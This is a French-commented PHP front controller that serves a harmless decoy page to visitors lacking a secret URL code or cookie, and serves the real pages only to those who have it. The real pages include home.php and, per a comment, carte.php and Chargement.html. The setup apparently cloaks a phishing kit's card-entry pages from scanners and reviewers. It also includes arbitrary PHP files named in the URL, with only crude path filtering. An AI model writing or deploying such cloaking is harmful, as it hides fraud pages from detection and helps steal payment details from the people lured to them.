<?php
// index.php – Front controller avec page leurre + cookie de session secrète
require __DIR__ . '/protect.php';

$url = $_GET['url'] ?? '';
$url = str_replace(['..', "\0"], '', $url);

// ⚠️ CONFIG
$codeSecret = 'x8';              // le code court
$paramName  = 'c';               // nom du paramètre dans l'URL
$pageReelle = 'home.php';        // page protégée réelle
$pageLeurre = 'legitime.php';    // page neutre
$cookieName = '_secret_ok';      // cookie qui mémorise le code valide
$cookieDuration = 3600;          // durée en secondes (1 heure)

// --- Gestion du paramètre secret ---
$hasSecret = false;

if (isset($_GET[$paramName]) && $_GET[$paramName] === $codeSecret) {
    // Le visiteur a le bon code dans l'URL → on enregistre le cookie
    setcookie($cookieName, '1', [
        'expires' => time() + $cookieDuration,
        'path' => '/',
        'samesite' => 'Lax',
        'secure' => false,
        'httponly' => true,
    ]);
    $hasSecret = true;
} elseif (isset($_COOKIE[$cookieName]) && $_COOKIE[$cookieName] === '1') {
    // Le visiteur a déjà eu le bon code (cookie présent)
    $hasSecret = true;
}

// --- Choix de la page à afficher ---
if ($url === '') {
    if ($hasSecret) {
        $url = $pageReelle;   // vraie page
    } else {
        $url = $pageLeurre;   // page leurre
    }
} else {
    // Si un autre chemin est demandé (ex: carte.php, Chargement.html...)
    // On vérifie que le visiteur est autorisé (cookie ou paramètre)
    if (!$hasSecret) {
        // Pas autorisé → on affiche la page leurre (ou on bloque)
        $url = $pageLeurre;
    }
    // Sinon, on laisse l'URL demandée
}

// --- Service du fichier ---
$file = __DIR__ . '/' . $url;

if (file_exists($file) && is_file($file)) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));

    $mimeTypes = [
        'css'   => 'text/css',
        'js'    => 'application/javascript',
        'png'   => 'image/png',
        'jpg'   => 'image/jpeg',
        'jpeg'  => 'image/jpeg',
        'gif'   => 'image/gif',
        'ico'   => 'image/x-icon',
        'svg'   => 'image/svg+xml',
        'woff'  => 'font/woff',
        'woff2' => 'font/woff2',
        'ttf'   => 'font/ttf',
        'eot'   => 'application/vnd.ms-fontobject',
        'webp'  => 'image/webp',
        'pdf'   => 'application/pdf',
        'html'  => 'text/html',
        'htm'   => 'text/html',
        'txt'   => 'text/plain',
        'php'   => 'text/html',
    ];

    if ($ext === 'php') {
        include $file;
        exit;
    }

    if (isset($mimeTypes[$ext])) {
        header('Content-Type: ' . $mimeTypes[$ext]);
    } else {
        header('Content-Type: application/octet-stream');
    }

    $cacheDuration = 3600;
    header('Cache-Control: public, max-age=' . $cacheDuration);
    header('Expires: ' . gmdate('D, d M Y H:i:s', time() + $cacheDuration) . ' GMT');

    readfile($file);
    exit;
}

http_response_code(404);
echo '<h1>404 - Page introuvable</h1>';
?>